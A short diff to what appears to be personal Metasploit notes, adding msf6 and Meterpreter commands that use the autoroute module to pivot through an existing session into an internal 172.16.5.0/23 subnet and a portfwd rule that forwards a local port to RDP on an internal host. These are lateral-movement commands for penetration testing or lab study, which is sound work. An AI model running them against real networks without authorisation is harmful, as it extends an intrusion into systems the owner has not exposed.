@@ -72,6 +72,20 @@ Auxiliary action:
    # also putting in jobs is an option
 ```
 
+Using autoroutes
 ```bash
-run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+msf6 > use post/multi/manage/autoroute 
+msf6 post(multi/manage/autoroute) > set SESSION 1 SESSION => 1 
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0 SUBNET => 172.16.5.0 
+msf6 post(multi/manage/autoroute) > run
+
+# running the autorun
+run autoroute -s 172.16.5.0/23
+```
+
+```bash
+# Port forwarding
+meterpreter > help portfwd
+portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
 ```
